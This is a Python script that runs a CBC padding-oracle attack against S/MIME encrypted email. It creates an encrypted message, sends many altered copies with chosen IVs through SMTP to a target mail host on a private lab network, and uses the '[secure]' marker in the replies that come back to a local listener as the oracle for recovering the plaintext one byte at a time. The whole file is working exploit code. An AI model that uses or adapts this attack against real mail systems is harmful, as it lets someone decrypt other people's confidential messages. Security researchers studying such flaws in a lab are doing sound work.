#!/usr/bin/env -S authbind --depth 2 uv run --with aiosmtpd --with asn1crypto python

import os
import smtplib
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from aiosmtpd.controller import Controller
import asyncio
import subprocess
import tempfile
from asn1crypto import cms
from asn1crypto import core

class SimpleMailServer:
    def __init__(self):
        self.controller = None
        self.done = False
        self.results = None
        self.ct = None
        self.name = None

    def reset(self, prefix, l):
        self.results = [None] * l
        self.prefix = prefix

    async def await_results(self):
        while None in self.results:
            await asyncio.sleep(0.1)
        return self.results

    async def handle_RCPT(self, server, session, envelope, address, rcpt_options):
        envelope.rcpt_tos.append(address)
        return '250 OK'

    async def handle_DATA(self, server, session, envelope):
        lines = envelope.content.decode().split("\r\n")
        head = [l for l in lines if l.lower().startswith("subject: "+self.prefix)]
        if len(head) == 0:
            return '250 Message accepted for delivery'
        assert all(h == head[0] for h in head)
        head = head[0].split(": ")[1]
        head = head[len(self.prefix):].strip()
        idx = int(head.split(" ")[0], 16)
        self.results[idx] = "[secure]" in head
        return '250 Message accepted for delivery'

    def start(self, host='192.168.56.1', port=25):
        self.controller = Controller(self, hostname=host, port=port)
        self.controller.start()
        print(f"SMTP Server listening on {host}:{port}...")
        return self.controller

    def stop(self):
        if self.controller:
            self.controller.stop()


def encrypt_email():
    from_address = "temp@tmp.test"
    to_address = "smime1@single.test"
    email_content = "Code: " + os.urandom(16).hex()
    subject = "Secret Code"
    msg = MIMEText(email_content, 'plain', 'utf-8')

    # Write the message to a temporary file
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.eml') as temp_msg:
        temp_msg.write(msg.as_string())
        temp_msg_path = temp_msg.name

    encrypted_path = temp_msg_path + '.enc'
    openssl_encrypt_cmd = [
        'openssl', 'smime', '-encrypt',
        '-in', temp_msg_path,
        '-out', encrypted_path,
        '-outform', 'DER',
        '-binary',
        "Single_S_MIME_User_1.crt"
    ]

    subprocess.run(openssl_encrypt_cmd, check=True, capture_output=True)

    with open(encrypted_path, 'rb') as f:
        res = f.read()

    for temp_file in [temp_msg_path, encrypted_path]:
        try:
            os.unlink(temp_file)
        except:
            pass
    return res

def pack_email(base, iv, ct, name):
    assert base['content_type'].dotted == "1.2.840.113549.1.7.3"
    enveloped_data = base['content']
    encrypted_content_info = enveloped_data['encrypted_content_info']
    content_encryption_algorithm = encrypted_content_info['content_encryption_algorithm']
    algorithm = content_encryption_algorithm['algorithm'].dotted

    assert algorithm in ["2.16.840.1.101.3.4.1.2", "2.16.840.1.101.3.4.1.22", "2.16.840.1.101.3.4.1.42"] # AES CBC (according to some LLM)

    # Create new algorithm identifier with modified IV
    new_algorithm = cms.EncryptionAlgorithm({
        'algorithm': content_encryption_algorithm['algorithm'],
        'parameters': core.OctetString(bytes(16))
    })

    # Create new EncryptedContentInfo
    new_encrypted_content_info = cms.EncryptedContentInfo({
        'content_type': encrypted_content_info['content_type'],
        'content_encryption_algorithm': new_algorithm,
        'encrypted_content': core.OctetString(iv+ct)
    })

    # Create new EnvelopedData
    new_enveloped_data = cms.EnvelopedData({
        'version': enveloped_data['version'],
        'recipient_infos': enveloped_data['recipient_infos'],
        'encrypted_content_info': new_encrypted_content_info
    })

    # Create new ContentInfo
    new_content_info = cms.ContentInfo({
        'content_type': base['content_type'],
        'content': new_enveloped_data
    })

    # Dump the new structure
    encrypted_data = new_content_info.dump()

    # Create final encrypted message
    encrypted_msg = MIMEApplication(encrypted_data, 'pkcs7-mime', name='smime.p7m')
    encrypted_msg['From'] = "pt@tmp.test"
    encrypted_msg['To'] = "smime1@single.test"
    encrypted_msg['Subject'] = name

    return encrypted_msg

async def test_all(eci, ivs, ct, remote, name):
    client, server = remote
    server.reset(f"{ct.hex()} {name}", len(ivs))
    msgs = [pack_email(eci, iv, ct, f"{ct.hex()} {name} {i:02x}") for i, iv in enumerate(ivs)]

    # Send emails in parallel batches (reuse connections)
    batch_size = 10  # 10 emails per connection
    tasks = []
    for i, msg in enumerate(msgs):
        if i % 64 == 0:
            print(f"Sending message {ct.hex()} {name} {i:02x}")
        client.send_message(msg)

    return await server.await_results()

async def dec_block(eci, ct, remote):
    r = await test_all(eci, [bytes(15)+bytes([i]) for i in range(256)], ct, remote, "b1")
    for i, v in enumerate(r):
        if v:
            rr = await test_all(eci, [bytes(14)+bytes([1, i])], ct, remote, "ck")
            if all(rr):
                tail = bytes([i^1])
                break
    else:
        assert False

    for i in range(2, 17):
        t = bytes([x^i for x in tail])
        r = await test_all(eci, [bytes(16-i)+bytes([j])+t for j in range(256)], ct, remote, f"b{i}")
        assert r.count(True) == 1, r
        tail = bytes([r.index(True)^i]) + tail
    return tail

def xor(a, b):
    assert len(a) == len(b) == 16
    return bytes(i ^ j for i, j in zip(a, b))

async def main():
    client = smtplib.SMTP("192.168.56.101")
    server = SimpleMailServer()
    server.start()

    encrypted = encrypt_email()
    env_content_info = cms.ContentInfo.load(encrypted)
    iv = env_content_info['content']['encrypted_content_info']['content_encryption_algorithm']['parameters'].contents
    ct = env_content_info['content']['encrypted_content_info']['encrypted_content'].contents
    assert len(ct) % 16 == 0
    assert len(iv) == 16
    pt = b''
    for i in range(0, len(ct), 16):
        pt += xor((iv+ct)[i:i+16], await dec_block(env_content_info, ct[i:i+16], (client, server)))
        print("pt", (i+16)/len(ct), pt)

    server.stop()
    client.quit()

if __name__ == "__main__":
    asyncio.run(main())
